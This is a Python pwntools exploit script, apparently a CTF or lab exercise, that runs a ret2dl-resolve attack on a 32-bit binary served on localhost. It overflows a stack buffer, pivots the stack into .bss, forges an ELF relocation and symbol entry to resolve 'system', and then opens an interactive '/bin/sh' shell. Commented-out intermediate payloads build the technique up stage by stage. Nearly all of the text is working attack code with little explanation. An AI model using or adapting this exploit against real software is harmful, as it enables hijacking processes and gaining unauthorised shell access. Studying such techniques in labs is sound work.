#!/usr/bin/env python

from pwn import *

# context.log_level = 'debug'

elf = ELF('./a.out')
io = remote('127.0.0.1', 10001)
io.recv()

pppr_addr      = 0x08048699     # pop esi ; pop edi ; pop ebp ; ret
pop_ebp_addr   = 0x0804869b     # pop ebp ; ret
leave_ret_addr = 0x080484b6     # leave ; ret

write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt  = elf.plt['read']

plt_0    = elf.get_section_by_name('.plt').header.sh_addr        # 0x80483e0
rel_plt  = elf.get_section_by_name('.rel.plt').header.sh_addr    # 0x8048390
dynsym   = elf.get_section_by_name('.dynsym').header.sh_addr     # 0x80481cc
dynstr   = elf.get_section_by_name('.dynstr').header.sh_addr     # 0x804828c
bss_addr = elf.get_section_by_name('.bss').header.sh_addr        # 0x804a028

base_addr = bss_addr + 0x600    # 0x804a628

payload_1  = "A" * 112
payload_1 += p32(read_plt)
payload_1 += p32(pppr_addr)
payload_1 += p32(0)
payload_1 += p32(base_addr)
payload_1 += p32(100)
payload_1 += p32(pop_ebp_addr)
payload_1 += p32(base_addr)
payload_1 += p32(leave_ret_addr)
io.send(payload_1)

# payload_2  = "AAAA"     # new ebp
# payload_2 += p32(write_plt)
# payload_2 += "AAAA"
# payload_2 += p32(1)
# payload_2 += p32(base_addr + 80)
# payload_2 += p32(len("/bin/sh"))
# payload_2 += "A" * (80 - len(payload_2))
# payload_2 += "/bin/sh\x00"
# payload_2 += "A" * (100 - len(payload_2))
# io.sendline(payload_2)
# print io.recv()

# reloc_index = 0x20
# payload_3  = "AAAA"
# payload_3 += p32(plt_0)
# payload_3 += p32(reloc_index)
# payload_3 += "AAAA"
# payload_3 += p32(1)
# payload_3 += p32(base_addr + 80)
# payload_3 += p32(len("/bin/sh"))
# payload_3 += "A" * (80 - len(payload_3))
# payload_3 += "/bin/sh\x00"
# payload_3 += "A" * (100 - len(payload_3))
# io.sendline(payload_3)
# print io.recv()

# reloc_index = base_addr + 28 - rel_plt  # fake_reloc = base_addr + 28
# r_info = 0x707
# fake_reloc = p32(write_got) + p32(r_info)
# payload_4  = "AAAA"
# payload_4 += p32(plt_0)
# payload_4 += p32(reloc_index)
# payload_4 += "AAAA"
# payload_4 += p32(1)
# payload_4 += p32(base_addr + 80)
# payload_4 += p32(len("/bin/sh"))
# payload_4 += fake_reloc
# payload_4 += "A" * (80 - len(payload_4))
# payload_4 += "/bin/sh\x00"
# payload_4 += "A" * (100 - len(payload_4))
# io.sendline(payload_4)
# print io.recv()

# reloc_index = base_addr + 28 - rel_plt
# fake_sym_addr = base_addr + 36
# align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # since the size of Elf32_Sym is 0x10
# fake_sym_addr = fake_sym_addr + align
# r_sym = (fake_sym_addr - dynsym) / 0x10  # calcute the symbol index since the size of Elf32_Sym
# r_type = 0x7    # R_386_JMP_SLOT -> Create PLT entry
# r_info = (r_sym << 8) + (r_type & 0xff) # ELF32_R_INFO(sym, type) = (((sym) << 8) + ((type) & 0xff))
# fake_reloc = p32(write_got) + p32(r_info)
# st_name = 0x4c
# st_info = 0x12
# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
# payload_5  = "AAAA"
# payload_5 += p32(plt_0)
# payload_5 += p32(reloc_index)
# payload_5 += "AAAA"
# payload_5 += p32(1)
# payload_5 += p32(base_addr + 80)
# payload_5 += p32(len("/bin/sh"))
# payload_5 += fake_reloc
# payload_5 += "A" * align
# payload_5 += fake_sym
# payload_5 += "A" * (80 - len(payload_5))
# payload_5 += "/bin/sh\x00"
# payload_5 += "A" * (100 - len(payload_5))
# io.sendline(payload_5)
# print io.recv()

# reloc_index = base_addr + 28 - rel_plt
# fake_sym_addr = base_addr + 36
# align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
# fake_sym_addr = fake_sym_addr + align
# r_sym = (fake_sym_addr - dynsym) / 0x10
# r_type = 0x7
# r_info = (r_sym << 8) + (r_type & 0xff)
# fake_reloc = p32(write_got) + p32(r_info)
# st_name = fake_sym_addr + 0x10 - dynstr     # address of string "write"
# st_bind = 0x1   # STB_GLOBAL -> Global symbol
# st_type = 0x2   # STT_FUNC -> Symbol is a code object
# st_info = (st_bind << 4) + (st_type & 0xf)  # 0x12
# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
# payload_6 = "AAAA"
# payload_6 += p32(plt_0)
# payload_6 += p32(reloc_index)
# payload_6 += "AAAA"
# payload_6 += p32(1)
# payload_6 += p32(base_addr + 80)
# payload_6 += p32(len("/bin/sh"))
# payload_6 += fake_reloc
# payload_6 += "A" * align
# payload_6 += fake_sym
# payload_6 += "write\x00"
# payload_6 += "A" * (80 - len(payload_6))
# payload_6 += "/bin/sh\x00"
# payload_6 += "A" * (100 - len(payload_6))
# io.sendline(payload_6)
# print io.recv()

# reloc_index = base_addr + 28 - rel_plt
# fake_sym_addr = base_addr + 36
# align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
# fake_sym_addr = fake_sym_addr + align
# r_sym = (fake_sym_addr - dynsym) / 0x10
# r_info = (r_sym << 8) + 0x7
# fake_reloc = p32(write_got) + p32(r_info)
# st_name = fake_sym_addr + 0x10 - dynstr
# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
# payload_7  = "AAAA"
# payload_7 += p32(plt_0)
# payload_7 += p32(reloc_index)
# payload_7 += "AAAA"
# payload_7 += p32(base_addr + 80)
# payload_7 += "AAAA"
# payload_7 += "AAAA"
# payload_7 += fake_reloc
# payload_7 += "A" * align
# payload_7 += fake_sym
# payload_7 += "system\x00"
# payload_7 += "A" * (80 - len(payload_7))
# payload_7 += "/bin/sh\x00"
# payload_7 += "A" * (100 - len(payload_7))
# io.sendline(payload_7)

reloc_index = base_addr + 28 - rel_plt
fake_sym_addr = base_addr + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
r_sym = (fake_sym_addr - dynsym) / 0x10
r_type = 0x7
r_info = (r_sym << 8) + (r_type & 0xff)
fake_reloc = p32(write_got) + p32(r_info)
st_name = fake_sym_addr + 0x10 - dynstr
st_bind = 0x1
st_type = 0x2
st_info = (st_bind << 4) + (st_type & 0xf)
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
payload_7 = "AAAA"
payload_7 += p32(plt_0)
payload_7 += p32(reloc_index)
payload_7 += "AAAA"
payload_7 += p32(base_addr + 80)
payload_7 += "AAAA"
payload_7 += "AAAA"
payload_7 += fake_reloc
payload_7 += "A" * align
payload_7 += fake_sym
payload_7 += "system\x00"
payload_7 += "A" * (80 - len(payload_7))
payload_7 += "/bin/sh\x00"
payload_7 += "A" * (100 - len(payload_7))
io.sendline(payload_7)
io.interactive()